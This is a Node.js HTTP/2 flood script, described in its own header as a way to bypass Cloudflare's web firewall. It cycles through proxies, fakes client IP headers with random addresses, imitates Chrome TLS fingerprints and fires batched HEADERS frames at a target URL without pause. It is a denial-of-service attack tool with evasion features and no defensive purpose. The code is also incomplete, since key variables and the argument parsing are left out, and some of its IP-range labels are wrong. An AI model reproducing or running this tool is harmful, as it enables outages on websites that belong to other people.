//mix http 2 1,1 - Enhanced version to bypass Cloudflare WAF
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const chalk = require('chalk');
const { Buffer } = require('buffer');

// Enhanced proxy management with validation and health checking
class ProxyManager {
  constructor(proxyFile) {
    this.proxies = [];
    this.healthyProxies = [];
    this.failedProxies = new Set();
    this.proxyStats = new Map();
    this.loadProxies(proxyFile);
    this.startHealthCheck();
  }

  loadProxies(proxyFile) {
    const rawProxies = fs.readFileSync(proxyFile, 'utf8')
      .replace(/\r/g, '')
      .split('\n')
      .filter(line => {
        const [host, port, username, password] = line.split(':');
        return host && port && !isNaN(port);
      });

    this.proxies = rawProxies.map(line => {
      const [host, port, username, password] = line.split(':');
      return {
        host: host.trim(),
        port: parseInt(port.trim()),
        username: username ? username.trim() : null,
        password: password ? password.trim() : null,
        lastUsed: 0,
        failures: 0,
        success: 0,
        responseTime: 0
      };
    });

    this.healthyProxies = [...this.proxies];
    console.log(`Loaded ${this.proxies.length} proxies`);
  }

  getRandomProxy() {
    if (this.healthyProxies.length === 0) {
      this.healthyProxies = this.proxies.filter(p => !this.failedProxies.has(`${p.host}:${p.port}`));
      this.failedProxies.clear();
    }

    if (this.healthyProxies.length === 0) return null;

    // Weighted selection based on success rate
    const weightedProxies = this.healthyProxies.map(proxy => {
      const successRate = proxy.success / Math.max(proxy.success + proxy.failures, 1);
      const timeWeight = Math.max(0, 1000 - proxy.responseTime) / 1000;
      return { proxy, weight: successRate * timeWeight };
    });

    const totalWeight = weightedProxies.reduce((sum, p) => sum + p.weight, 0);
    let random = Math.random() * totalWeight;

    for (const { proxy, weight } of weightedProxies) {
      random -= weight;
      if (random <= 0) return proxy;
    }

    return this.healthyProxies[Math.floor(Math.random() * this.healthyProxies.length)];
  }

  markProxySuccess(proxy) {
    proxy.success++;
    proxy.lastUsed = Date.now();
  }

  markProxyFailure(proxy) {
    proxy.failures++;
    if (proxy.failures > 5) {
      this.failedProxies.add(`${proxy.host}:${proxy.port}`);
      this.healthyProxies = this.healthyProxies.filter(p => p !== proxy);
    }
  }

  startHealthCheck() {
    setInterval(() => {
      const now = Date.now();
      this.failedProxies.forEach(proxyKey => {
        const [host, port] = proxyKey.split(':');
        const proxy = this.proxies.find(p => p.host === host && p.port === parseInt(port));
        if (proxy && now - proxy.lastUsed > 300000) {
          this.failedProxies.delete(proxyKey);
          this.healthyProxies.push(proxy);
          proxy.failures = Math.max(0, proxy.failures - 2);
        }
      });
    }, 30000);
  }
}

// Enhanced IP rotation with residential IP patterns
class IPRotationManager {
  constructor() {
    this.residentialRanges = [
      { start: "1.0.0.0", end: "1.255.255.255", country: "US" },
      { start: "2.0.0.0", end: "2.255.255.255", country: "US" },
      { start: "3.0.0.0", end: "3.255.255.255", country: "US" },
      { start: "8.8.0.0", end: "8.8.255.255", country: "US" },
      { start: "13.0.0.0", end: "13.255.255.255", country: "US" },
      { start: "23.0.0.0", end: "23.255.255.255", country: "US" },
      { start: "24.0.0.0", end: "24.255.255.255", country: "US" },
      { start: "45.0.0.0", end: "45.255.255.255", country: "US" },
      { start: "47.0.0.0", end: "47.255.255.255", country: "US" },
      { start: "50.0.0.0", end: "50.255.255.255", country: "US" },
      { start: "52.0.0.0", end: "52.255.255.255", country: "US" },
      { start: "54.0.0.0", end: "54.255.255.255", country: "US" },
      { start: "67.0.0.0", end: "67.255.255.255", country: "US" },
      { start: "68.0.0.0", end: "68.255.255.255", country: "US" },
      { start: "69.0.0.0", end: "69.255.255.255", country: "US" },
      { start: "70.0.0.0", end: "70.255.255.255", country: "US" },
      { start: "71.0.0.0", end: "71.255.255.255", country: "US" },
      { start: "72.0.0.0", end: "72.255.255.255", country: "US" },
      { start: "73.0.0.0", end: "73.255.255.255", country: "US" },
      { start: "74.0.0.0", end: "74.255.255.255", country: "US" },
      { start: "75.0.0.0", end: "75.255.255.255", country: "US" },
      { start: "76.0.0.0", end: "76.255.255.255", country: "US" },
      { start: "96.0.0.0", end: "96.255.255.255", country: "US" },
      { start: "97.0.0.0", end: "97.255.255.255", country: "US" },
      { start: "98.0.0.0", end: "98.255.255.255", country: "US" },
      { start: "99.0.0.0", end: "99.255.255.255", country: "US" },
      { start: "100.0.0.0", end: "100.255.255.255", country: "US" },
      { start: "104.0.0.0", end: "104.255.255.255", country: "US" },
      { start: "107.0.0.0", end: "107.255.255.255", country: "US" },
      { start: "108.0.0.0", end: "108.255.255.255", country: "US" },
      { start: "162.0.0.0", end: "162.255.255.255", country: "US" },
      { start: "173.0.0.0", end: "173.255.255.255", country: "US" },
      { start: "174.0.0.0", end: "174.255.255.255", country: "US" },
      { start: "184.0.0.0", end: "184.255.255.255", country: "US" },
      { start: "192.0.0.0", end: "192.255.255.255", country: "US" },
      { start: "198.0.0.0", end: "198.255.255.255", country: "US" },
      { start: "199.0.0.0", end: "199.255.255.255", country: "US" },
      { start: "204.0.0.0", end: "204.255.255.255", country: "US" },
      { start: "205.0.0.0", end: "205.255.255.255", country: "US" },
      { start: "206.0.0.0", end: "206.255.255.255", country: "US" },
      { start: "207.0.0.0", end: "207.255.255.255", country: "US" },
      { start: "208.0.0.0", end: "208.255.255.255", country: "US" },
      { start: "209.0.0.0", end: "209.255.255.255", country: "US" }
    ];
    this.currentIP = this.generateResidentialIP();
  }

  generateResidentialIP() {
    const range = this.residentialRanges[Math.floor(Math.random() * this.residentialRanges.length)];
    const start = this.ipToNumber(range.start);
    const end = this.ipToNumber(range.end);
    const randomIP = start + Math.floor(Math.random() * (end - start + 1));
    return this.numberToIP(randomIP);
  }

  ipToNumber(ip) {
    return ip.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet), 0) >>> 0;
  }

  numberToIP(num) {
    return [(num >>> 24), (num >>> 16) & 255, (num >>> 8) & 255, num & 255].join('.');
  }

  getCurrentIP() {
    // Rotate IP every 10-30 seconds
    if (Math.random() < 0.1) {
      this.currentIP = this.generateResidentialIP();
    }
    return this.currentIP;
  }
}

// Enhanced connection management with session persistence
class ConnectionManager {
  constructor() {
    this.connections = new Map();
    this.sessionCache = new Map();
    this.maxConnections = 1000;
  }

  getConnection(proxy) {
    const key = `${proxy.host}:${proxy.port}`;
    
    if (this.connections.has(key)) {
      const conns = this.connections.get(key);
      if (conns.length > 0) {
        return conns.pop();
      }
    }

    return this.createConnection(proxy);
  }

  createConnection(proxy) {
    return new Promise((resolve, reject) => {
      const socket = net.connect(proxy.port, proxy.host, () => {
        resolve(socket);
      });
      
      socket.on('error', reject);
      socket.setTimeout(30000);
    });
  }

  returnConnection(proxy, socket) {
    const key = `${proxy.host}:${proxy.port}`;
    
    if (!this.connections.has(key)) {
      this.connections.set(key, []);
    }
    
    const conns = this.connections.get(key);
    if (conns.length < 10) {
      conns.push(socket);
    } else {
      socket.destroy();
    }
  }
}

// Enhanced TLS fingerprinting with more realistic patterns
function generateAdvancedTLSFingerprint() {
  const chromeVersions = [
    { version: "120.0.6099.109", build: "120.0.6099.109" },
    { version: "121.0.6167.85", build: "121.0.6167.85" },
    { version: "122.0.6261.69", build: "122.0.6261.69" },
    { version: "123.0.6312.86", build: "123.0.6312.86" },
    { version: "124.0.6367.78", build: "124.0.6367.78" }
  ];

  const selectedVersion = chromeVersions[Math.floor(Math.random() * chromeVersions.length)];
  
  return {
    version: selectedVersion.version,
    build: selectedVersion.build,
    userAgent: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${selectedVersion.version} Safari/537.36`,
    ciphers: [
      'TLS_AES_128_GCM_SHA256',
      'TLS_AES_256_GCM_SHA384', 
      'TLS_CHACHA20_POLY1305_SHA256',
      'ECDHE-ECDSA-AES128-GCM-SHA256',
      'ECDHE-RSA-AES128-GCM-SHA256',
      'ECDHE-ECDSA-AES256-GCM-SHA384',
      'ECDHE-RSA-AES256-GCM-SHA384',
      'ECDHE-ECDSA-CHACHA20-POLY1305',
      'ECDHE-RSA-CHACHA20-POLY1305'
    ],
    extensions: [
      'server_name',
      'status_request', 
      'supported_groups',
      'signature_algorithms',
      'alpn',
      'signed_certificate_timestamp',
      'extended_master_secret',
      'compress_certificate',
      'session_ticket',
      'supported_versions',
      'psk_key_exchange_modes',
      'key_share',
      'renegotiation_info'
    ],
    curves: ['X25519', 'secp256r1', 'secp384r1'],
    signatureAlgorithms: [
      'ecdsa_secp256r1_sha256',
      'rsa_pss_rsae_sha256', 
      'rsa_pkcs1_sha256',
      'ecdsa_secp384r1_sha384',
      'rsa_pss_rsae_sha384',
      'rsa_pkcs1_sha384'
    ]
  };
}

// Enhanced header generation with more realistic patterns
function generateAdvancedHeaders() {
  const fingerprint = generateAdvancedTLSFingerprint();
  const ipManager = new IPRotationManager();
  const clientIP = ipManager.getCurrentIP();
  
  const baseHeaders = {
    'User-Agent': fingerprint.userAgent,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate', 
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-User': '?0',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'max-age=0'
  };

  // Add realistic IP headers
  const ipHeaders = {
    'X-Forwarded-For': clientIP,
    'X-Real-IP': clientIP,
    'X-Client-IP': clientIP,
    'CF-Connecting-IP': clientIP,
    'True-Client-IP': clientIP,
    'X-Originating-IP': clientIP,
    'X-Remote-IP': clientIP,
    'X-Remote-Addr': clientIP
  };

  // Add random additional headers
  const additionalHeaders = {};
  if (Math.random() < 0.3) additionalHeaders['DNT'] = '1';
  if (Math.random() < 0.2) additionalHeaders['X-Requested-With'] = 'XMLHttpRequest';
  if (Math.random() < 0.4) additionalHeaders['X-Forwarded-Proto'] = 'https';
  if (Math.random() < 0.3) additionalHeaders['X-Forwarded-Port'] = '443';

  return { ...baseHeaders, ...ipHeaders, ...additionalHeaders };
}

// Enhanced request timing with human-like patterns
class RequestTimingManager {
  constructor() {
    this.baseDelay = 100;
    this.maxDelay = 2000;
    this.jitter = 0.3;
  }

  getDelay() {
    const base = this.baseDelay + Math.random() * (this.maxDelay - this.baseDelay);
    const jitterAmount = base * this.jitter * (Math.random() - 0.5);
    return Math.max(50, base + jitterAmount);
  }

  getBatchDelay() {
    return Math.max(10, this.baseDelay / 10 + Math.random() * 50);
  }
}

// Main request function with enhanced proxy handling
function go() {
  const proxy = proxyManager.getRandomProxy();
  if (!proxy) {
    setTimeout(go, 1000);
    return;
  }

  const timingManager = new RequestTimingManager();
  const connectionManager = new ConnectionManager();
  
  // Create connection with enhanced error handling
  connectionManager.getConnection(proxy)
    .then(socket => {
      const startTime = Date.now();
      
      socket.once('data', () => {
        // Enhanced HTTP/2 connection with better error handling
        createEnhancedHTTP2Connection(socket, proxy, timingManager);
      });

      socket.on('error', (error) => {
        proxyManager.markProxyFailure(proxy);
        socket.destroy();
        setTimeout(go, timingManager.getDelay());
      });

      socket.on('close', () => {
        connectionManager.returnConnection(proxy, socket);
        setTimeout(go, timingManager.getDelay());
      });

      // Send CONNECT request with enhanced headers
      const connectHeaders = generateAdvancedHeaders();
      const connectRequest = `CONNECT ${url.host}:443 HTTP/1.1\r\n` +
        `Host: ${url.host}:443\r\n` +
        `Connection: Keep-Alive\r\n` +
        Object.entries(connectHeaders)
          .map(([key, value]) => `${key}: ${value}`)
          .join('\r\n') +
        '\r\n\r\n';
      
      socket.write(connectRequest);
    })
    .catch(error => {
      proxyManager.markProxyFailure(proxy);
      setTimeout(go, timingManager.getDelay());
    });
}

// Enhanced HTTP/2 connection function
function createEnhancedHTTP2Connection(socket, proxy, timingManager) {
  const fingerprint = generateAdvancedTLSFingerprint();
  
  const tlsOptions = {
    socket: socket,
    ALPNProtocols: ['h2', 'http/1.1'],
    servername: url.hostname,
    ciphers: fingerprint.ciphers.join(':'),
    sigalgs: fingerprint.signatureAlgorithms.join(':'),
    secureOptions: 
      crypto.constants.SSL_OP_NO_SSLv2 |
      crypto.constants.SSL_OP_NO_SSLv3 |
      crypto.constants.SSL_OP_NO_TLSv1 |
      crypto.constants.SSL_OP_NO_TLSv1_1 |
      crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
    secure: true,
    session: crypto.randomBytes(64),
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    ecdhCurve: fingerprint.curves.join(':'),
    rejectUnauthorized: false
  };

  const tlsSocket = tls.connect(tlsOptions, () => {
    if (tlsSocket.alpnProtocol !== 'h2') {
      tlsSocket.destroy();
      return;
    }

    // Enhanced HTTP/2 request handling
    handleHTTP2Requests(tlsSocket, proxy, timingManager);
  });

  tlsSocket.on('error', (error) => {
    proxyManager.markProxyFailure(proxy);
    tlsSocket.destroy();
  });
}

// Enhanced HTTP/2 request handling
function handleHTTP2Requests(tlsSocket, proxy, timingManager) {
  let streamId = 1;
  let hpack = new HPACK();
  
  // Send HTTP/2 preface and settings
  const preface = Buffer.from('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n', 'binary');
  const settings = encodeFrame(0, 4, encodeSettings([
    [1, 4096],    // HEADER_TABLE_SIZE
    [2, 0],       // ENABLE_PUSH
    [3, 1000],    // MAX_CONCURRENT_STREAMS
    [4, 65535],   // INITIAL_WINDOW_SIZE
    [5, 16384],   // MAX_FRAME_SIZE
    [6, 8192]     // MAX_HEADER_LIST_SIZE
  ]));
  
  tlsSocket.write(Buffer.concat([preface, settings]));

  // Enhanced request sending with better timing
  function sendRequests() {
    if (tlsSocket.destroyed) return;

    const batchSize = Math.min(ratelimit, 50);
    const requests = [];

    for (let i = 0; i < batchSize; i++) {
      const headers = generateAdvancedHeaders();
      const method = reqmethod;
      const path = url.pathname + (url.search || '');
      
      const pseudoHeaders = [
        [':method', method],
        [':authority', url.hostname],
        [':scheme', 'https'],
        [':path', path]
      ];

      const regularHeaders = Object.entries(headers)
        .filter(([key, value]) => !key.startsWith(':'))
        .map(([key, value]) => [key.toLowerCase(), value]);

      const allHeaders = [...pseudoHeaders, ...regularHeaders];
      const packed = hpack.encode(allHeaders);
      
      const frame = encodeFrame(streamId, 1, packed, 0x25);
      requests.push(frame);
      
      streamId += 2;
    }

    tlsSocket.write(Buffer.concat(requests), (err) => {
      if (err) {
        proxyManager.markProxyFailure(proxy);
        tlsSocket.destroy();
        return;
      }

      proxyManager.markProxySuccess(proxy);
      setTimeout(sendRequests, timingManager.getBatchDelay());
    });
  }

  sendRequests();
}

// Utility functions (keeping original implementations)
function encodeFrame(streamId, type, payload = "", flags = 0) {
  let frame = Buffer.alloc(9);
  frame.writeUInt32BE(payload.length << 8 | type, 0);
  frame.writeUInt8(flags, 4);
  frame.writeUInt32BE(streamId, 5);
  if (payload.length > 0)
    frame = Buffer.concat([frame, payload]);
  return frame;
}

function encodeSettings(settings) {
  const data = Buffer.alloc(6 * settings.length);
  for (let i = 0; i < settings.length; i++) {
    data.writeUInt16BE(settings[i][0], i * 6);
    data.writeUInt32BE(settings[i][1], i * 6 + 2);
  }
  return data;
}

// Initialize managers
const proxyManager = new ProxyManager(proxyfile);
const ipManager = new IPRotationManager();
const connectionManager = new ConnectionManager();
const timingManager = new RequestTimingManager();

// Rest of the original script logic...
// (Keep the original argument parsing, error handling, and cluster logic)